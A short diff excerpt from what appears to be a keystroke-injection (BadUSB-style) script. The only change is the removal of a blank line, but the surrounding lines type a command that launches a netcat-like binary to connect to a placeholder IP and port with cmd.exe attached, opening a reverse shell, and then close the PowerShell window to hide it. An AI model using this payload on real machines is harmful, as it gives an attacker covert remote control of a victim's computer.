@@ -28,6 +28,5 @@ REM Connect to listener
 STRING ./a.exe <IP_ADDR> <PORT> -e cmd.exe -d
 ENTER
 
-
 REM Exit Powershell
 ALT F4
